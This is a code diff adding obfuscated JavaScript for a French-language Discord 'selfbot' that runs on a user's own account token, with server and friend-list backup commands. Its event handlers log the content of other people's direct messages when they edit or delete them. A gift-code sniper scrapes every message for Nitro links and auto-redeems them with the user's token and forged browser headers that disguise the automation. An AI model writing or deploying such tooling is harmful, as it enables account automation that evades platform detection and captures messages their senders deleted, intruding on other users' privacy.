+                                                {
+                                                    return _0x18f2x41.type === 'category';
+                                                })
+                                            .find(_0x18f2x41 =>
+
+                                                {
+                                                    return _0x18f2x41['name'] === _0x18f2xae['parent'];
+                                                });
+                                        if (_0x18f2xae.parent)
+                                            (_0x18f2x41.setParent(_0x18f2xaf))
+                                        else
+                                            '';
+                                    });
+                        });
+                _0x18f2x3b.guild.setName(backups[_0x18f2x3b.author.id][_0x18f2xaa].name);
+                _0x18f2x3b.guild.setIcon(backups[_0x18f2x3b.author.id][_0x18f2xaa].icon);
+                console.log('Commande load backup executé'.yellow);
+            }
+            if (_0x18f2x3c.content.startsWith(prefix + 'backup info') || _0x18f2x3c.content.startsWith(prefix + 'backup i')) {
+                let _0x18f2x53 = _0x18f2x3d.splice(2)
+                    .join(' ');
+                let _0x18f2xb0 = new Discord.RichEmbed()
+                    .setTitle('' + (client.emojis.get('655704809483141141') || '❌') + '  Error')
+                    .setFooter('Delta-Selfbot')
+                    .setDescription('Tu as oublié de définir une **id de backup**. Utilise la commande \\`' + prefix + 'help\\` pour avoir plus d\'informations')
+                    .setColor(color);
+                if (!_0x18f2x3d.splice(2)
+                    .join(' ')) {
+                    return _0x18f2x3b['edit'](_0x18f2xb0)['catch'](_0x18f2x44 => {
+                        return console['log']('[', 'ERROR' ['red'], ']', 'une erreur est survenue que je ne peux régler' ['green']);
+                    });
+                }
+                let _0x18f2xb1 = new Discord.RichEmbed()
+                    .setTitle('' + (client.emojis.get('655704809483141141') || '❌') + '  Error')
+                    .setFooter('Delta-Selfbot')
+                    .setDescription('Tu n\'as pas de **backup** avec cet id \\`' + _0x18f2x3d.splice(2)
+                        .join(' ') + '\\`.')
+                    .setColor(color);
+                if (!backups[_0x18f2x3b.author.id][_0x18f2x53]) {
+                    return _0x18f2x3b['edit'](_0x18f2xb1);
+                }
+                    let _0x18f2xb2 = new Discord.RichEmbed()
+                        .setTitle(backups[_0x18f2x3b.author.id][_0x18f2x53].name)
+                        .setThumbnail(backups[_0x18f2x3b.author.id][_0x18f2x53].icon)
+                        .addField('Creator', '<@' + backups[_0x18f2x3b.author.id][_0x18f2x53].owner + '>', true)
+                        .addField('Members', backups[_0x18f2x3b.author.id][_0x18f2x53].members, true)
+                        .addField('Created At', backups[_0x18f2x3b.author.id][_0x18f2x53].createdAt)
+                        .addField('Channels', '\\`\\`\\`' + backups[_0x18f2x3b.author.id][_0x18f2x53].channels.map(_0x18f2x43 =>
+
+                                {
+                                    return _0x18f2x43.name;
+                                })
+                            .join('\n') + '\\`\\`\\`', true)
+                        .addField('Roles', '\\`\\`\\`' + backups[_0x18f2x3b.author.id][_0x18f2x53].roles.map(_0x18f2x46 =>
+
+                                {
+                                    return _0x18f2x46.name;
+                                })
+                            .join('\n') + '\\`\\`\\`', true);
+                    _0x18f2x3b.edit(_0x18f2xb2);
+                console.log('Commande backup info executé'.yellow);
+                    }
+            if (_0x18f2x3c.content.startsWith(prefix + 'backup purge')) {
+                let _0x18f2xab = new Discord.RichEmbed()
+                    .setTitle('' + (client.emojis.get('655704809483141141') || '❌') + '  Error')
+                    .setDescription('Vous n\'avez pas encore sauvegardé de serveur')
+                    .setColor(color);
+                if (!backups[_0x18f2x3b.author.id]) {
+                    return _0x18f2x3b['edit'](_0x18f2xab)['catch'](_0x18f2x44 => {
+                        return console['log']('[', 'ERROR' ['red'], ']', 'une erreur est survenue que je ne peux régler' ['green']);
+                    });
+                }
+                let _0x18f2xb4 = new Discord.RichEmbed()
+                    .setTitle('' + (client.emojis.get('656030540310380574') || '⚠️') + '  Warning')
+                    .setDescription('Es-tu sûr de vouloir supprimer toutes tes backups ?\r\n__Cette action est irréversible !__');
+                let _0x18f2xb5 = new Discord.RichEmbed()
+                    .setColor(color)
+                    .setTitle('Oui/Non')
+                    .setFooter('Delta-Selfbot')
+                    .addField('Etes vous sur de vouloir supprimer toutes vos backups???', 'Oui/Non');
+                _0x18f2x3b.edit(_0x18f2xb5)
+                    .then(() =>
+
+                        {
+                            _0x18f2x3b.channel.awaitMessages(_0x18f2x4a =>
+
+                                    {
+                                        return _0x18f2x4a.content === 'Oui';
+                                    }, {
+                                        max: 1,
+                                        time: 30000,
+                                        errors: ['time']
+                                    })
+                                .then(_0x18f2xb6 =>
+
+                                    {
+                                        delete backups[_0x18f2x3b.author.id];
+                                        let _0x18f2xad = new Discord.RichEmbed()
+                                            .setTitle('' + (client.emojis.get('655696285286006784') || '✅') + '  Voila!')
+                                            .setDescription('Deleted all your backups.')
+                                            .setFooter('Delta-Selfbot')
+                                            .setColor(color);
+                                        _0x18f2x3b.edit(_0x18f2xad)
+                                            .catch(_0x18f2x44 =>
+
+                                                {
+                                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                                                });
+                                        _0x18f2x3c.delete();
+                                        console.log('Commande purge backup executé'.yellow);
+                                    });
+                        });
+            }
+            if (_0x18f2x3b.content === prefix + 'backup friend') {
+                var _0x18f2xb7 = client.user.friends.size;
+                const _0x18f2xb8 = client.user.friends.array();
+                let _0x18f2xb9 = ('Successfully backed up ' + _0x18f2xb8.length.toString()
+                        .bold + ' friends.')
+                    .green;
+                console.log(_0x18f2xb9);
+                hastebins('' + client.user.friends.array() + '\\n')
+                    .then(_0x18f2x45 =>
+
+                        {
+                            var _0x18f2x12 = new Discord.RichEmbed()
+                                .setTitle('backup friends (<@id>)')
+                                .addField('```lien hastebins```', _0x18f2x45)
+                                .setColor(color)
+                                .setTimestamp()
+                                .setDescription('***vous pouvez copier coller la liste sur le channel actuel et vous pourrez ensuite faire clique droit sur un pseudo envoiller un message, add friend ect...***');
+                            _0x18f2x3b.edit(_0x18f2x12)
+                                .catch(_0x18f2x44 =>
+
+                                    {
+                                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                                    });
+                            console.log('Commande friends backup executé'.yellow);
+                        });
+            }
+
+            function _0x18f2xba(_0x18f2x19)
+
+            {
+                var _0x18f2xbb = '';
+                var _0x18f2xbc = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                var _0x18f2xbd = 62;
+                for (var i = 0; i < _0x18f2x19; i++) {
+                    _0x18f2xbb += _0x18f2xbc.charAt(Math.floor(Math.random() * _0x18f2xbd));
+                }
+                return _0x18f2xbb;
+            }
+
+            function _0x18f2xbe()
+
+            {
+                fs.writeFile('./Data/backups.json', JSON.stringify(backups), _0x18f2x6e =>
+
+                    {
+                        if (_0x18f2x6e) {
+                            console.error(_0x18f2x6e);
+                        }
+                    });
+            }
+        }
+    });
+
+client.on('messageUpdate', _0x18f2x3b => {
+    if (_0x18f2x3b.author.id === client.user.id) {
+        return;
+    }
+    if (_0x18f2x3b.channel.type === 'dm') {
+        console.log('\n╔═════════════════════════════════╗'.blue);
+        console.log('Log:'.red) ^ console.log('╟─────────────────────────────────╢'.blue);
+        console.log(('║--> message mp modifié \\n║--> User: ' + _0x18f2x3b.author.tag + '\\n║--> Content: ' + _0x18f2x3b.content + '\\n║--> At: ' + _0x18f2x3b.createdAt + '').green);
+        console.log('╚═════════════════════════════════╝'.blue);
+    }
+});
+
+client.on('messageDelete', _0x18f2x3b => {
+    if (_0x18f2x3b.author.id === client.user.id) {
+        return;
+    }
+    if (_0x18f2x3b.channel.type === 'dm') {
+        console.log('\n╔═════════════════════════════════╗'.blue);
+        console.log('Log:'.red) ^ console.log('╟─────────────────────────────────'.blue);
+        console.log(('║--> 1 message mp surppimé \\n║--> User: ' + _0x18f2x3b.author.tag + '\\n║--> Content: ' + _0x18f2x3b.content + '\\n║--> At: ' + _0x18f2x3b.createdAt + '')
+            .green);
+        console.log('╚═════════════════════════════════╝'.blue);
+    }
+    if (_0x18f2x3b.content.includes('@everyone') || _0x18f2x3b.content.includes('@here')) {
+        if (_0x18f2x3b.author.id === client.user.id) {
+            return;
+        }
+        if (_0x18f2x3b.channel.type === 'dm') {
+            return;
+        }
+        console.log('\n╔═════════════════════════════════╗'.blue);
+        console.log('Log:'.red) ^ console.log('╟─────────────────────────────────'.blue);
+        console.log(('║--> New ghostping \\n║--> serveur: ' + _0x18f2x3b.guild.name + ' \\n║--> channel: ' + _0x18f2x3b.channel.name + ' \\n║--> User: ' + _0x18f2x3b.author.tag + '\\n║--> Content: ' + _0x18f2x3b.content + '\\n║-->At: ' + _0x18f2x3b.createdAt + '').green);
+        console.log('╚═════════════════════════════════╝'.blue);
+    } else {
+        return;
+    }
+});
+
+function matchCode(_0x18f2x8b, _0x18f2xc0) {
+    let _0x18f2xc1 = _0x18f2x8b.match(/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/);
+    if (_0x18f2xc1) {
+        _0x18f2xc0(_0x18f2xc1[0]);
+        return matchCode(_0x18f2x8b['slice'](_0x18f2xc1['index'] + _0x18f2xc1[0]['length']), _0x18f2xc0);
+    } else {
+        _0x18f2xc0(null);
+    }
+}
+client.on('message', _0x18f2x3b => {
+    let _0x18f2xc1 = [];
+    matchCode(_0x18f2x3b.content, _0x18f2xaa => {
+        if (!_0x18f2xaa) {
+            return;
+        }
+        if (!_0x18f2xc1.includes(_0x18f2xaa)) {
+            _0x18f2xc1.push(_0x18f2xaa);
+        }
+    });
+    if (_0x18f2xc1.length == 0) {
+        return;
+    }
+    _0x18f2xc1.forEach(_0x18f2xaa => {
+        fetch('https://canary.discordapp.com/api/v6/entitlements/gift-codes/' + _0x18f2xaa.split('/')
+                .pop() + '/redeem', {
+                    method: 'post',
+                    headers: {
+                        'Accept': '*/*',
+                        'Accept-Encoding': 'gzip, deflate, br',
+                        'Accept-Language': 'en-US',
+                        'Authorization': client.token,
+                        'Connection': 'keep-alive',
+                        'Content-Length': JSON.stringify({
+                                channel_id: _0x18f2x3b.channel.id
+                            })
+                            .length,
+                        'Content-Type': 'application/json',
+                        'Host': 'canary.discordapp.com',
+                        'Referer': 'https://canary.discordapp.com/channels/' + _0x18f2x3b.channel.id + '/' + _0x18f2x3b.id + '',
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
+                        'X-super-properties': Buffer.from(JSON.stringify({
+                                'os': 'Windows',
+                                'browser': 'Firefox',
+                                'device': '',
+                                'browser_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
+                                'browser_version': '66.0',
+                                'os_version': '10',
+                                'referrer': '',
+                                'referring_domain': '',
+                                'referrer_current': '',
+                                'referring_domain_current': '',
+                                'release_channel': 'canary',
+                                'client_build_number': 37519,
+                                'client_event_source': null
+                            }), 'utf-8')
+                            .toString('base64')
+                    },
+                    body: JSON.stringify({
+                        channel_id: _0x18f2x3b.channel.id
+                    })
+                })
+            .then(_0x18f2xc2 =>
+
+                {
+                    if (_0x18f2xc2.status == 400 || _0x18f2xc2.status == 404) {
+                        return console['log'](`${ 'code invalide :  ' }${ _0x18f2xaa }${ '' }` ['red']);
+                    }
+                    _0x18f2xc2.json()
+                        .then(_0x18f2xc3 =>
+
+                            {
+                                console.log(_0x18f2xc3);
+                                console.log('Un nouveau nitro à sûrement été ajouté à tes crédits.'.green);
+                            });
+                })
+            .catch(console.error);
+    });
+});
+client.on('guildDelete', _0x18f2x16 => {
+    console.log('\n╔═════════════════════════════════╗'.blue);
+    console.log('Log:'.red) ^ console.log('╟─────────────────────────────────╢'.blue);
+    console.log('║--> Vous avez quitté le serveur undefined'.green);
+    console.log('╚═════════════════════════════════╝'.blue);
+});
+client.on('guildCreate', _0x18f2x16 => {
+    console.log('\n╔═════════════════════════════════╗'.blue);
+    console.log('Log:'.red) ^ console.log('╟─────────────────────────────────╢'.blue);
+    console.log('║--> Vous avez rejoint le serveur undefined'.green);
+    console.log('╚═════════════════════════════════╝'.blue);
+});
+client.login(token).catch(_0x18f2x6e => {
+    if (_0x18f2x6e.toString()
+        .includes('Incorrect login details were provided'.red) || _0x18f2x6e.toString()
+        .includes('An invalid token was provided'.red)) {
+        console.log('Token invalid!\nChange ton token dans le config.json'.red);
+    }
+});
